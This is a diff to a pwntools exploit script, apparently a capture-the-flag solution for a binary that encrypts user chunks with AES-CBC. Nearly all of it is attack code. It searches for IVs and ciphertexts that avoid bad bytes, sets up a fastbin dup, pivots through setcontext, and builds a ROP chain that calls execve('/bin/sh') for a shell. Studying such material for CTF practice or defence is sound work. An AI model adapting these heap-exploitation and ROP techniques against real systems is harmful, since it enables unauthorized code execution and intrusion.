@@ -14,7 +14,8 @@ elf = ELF(TARGET)
 def start():
     if not args.R:
         print("local")
-        return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6 ./libcrypto.so.1.0.0"})
+        return process(['./ld-linux-x86-64.so.2', '--library-path', './', TARGET])
+        # return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6 ./libcrypto.so.1.0.0"})
         # return process(TARGET)
         # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
         # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
@@ -103,7 +104,8 @@ pt += '\x02'*2
 # 3. we have to search good iv that meets above condition. (like example c)
 def search_iv(pt, key):
     ct = 'dummy'
-    while (hexlify(ct)[-2] != '0'):
+    random_iv = 'dummy'
+    while (hexlify(ct)[-2] != '0' or '\x0a' in random_iv or '\x20' in random_iv or '\x00' in random_iv):
         random_iv = os.urandom(0x10)
         cipher = AES.new(key, AES.MODE_CBC, random_iv)
         ct = cipher.encrypt(pt)
@@ -158,6 +160,10 @@ rdi = base + 0x0013e302
 rsi = base + 0x0012ee05
 rdx = base + 0x00115166
 
+rdi_p1 = base + 0x001032e4
+rsi_p1 = base + 0x0013b682
+rdx_rsi = base + 0x00115189
+
 # make fastbindup with 0x70 sized chunk
 conceal(3, 0x50, 'AAAA')
 conceal(4, 0x50, 'BBBB')
@@ -200,7 +206,8 @@ pt = p64(0xdeadbeef)*2
 pt += '/bin/sh\x00'
 pt += p64(0xdeadbeef)*2
 pt += p64(setcontext)
-pt += p64(0xdeadbeef)*2
+pt += p64(0xdead) # IO_write_base
+pt += p64(0xdeadbeef)
 ct = search_ct(pt, iv, key)
 conceal(6, 0x50, ct)
 
@@ -221,13 +228,11 @@ while '\x00' in ct or '\x0a' in ct:
 log.info("done")
 conceal(8, 0x50, ct)
 
-# build rop in 0x80 sized chunk
-# (this is hard part because we can't search..)
-log.info("hard part here. may be need reset....")
-pt = flat(rdi, heap+0x24c0, rsi, 0, rdx, 0)
-pt += flat(rax, 0x3b, syscall, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef)
+# build rop in heap
+pt = flat(0xdeadbeef, heap+0x24c0, rdx_rsi, 0)
+pt += flat(0, rax, 0x3b, syscall)
 ct = search_ct(pt, iv, key)
-conceal(9, 0x60, ct)
+conceal(9, 0x40, ct)
 
 if args.D:
     debug(r, [0x17d7])
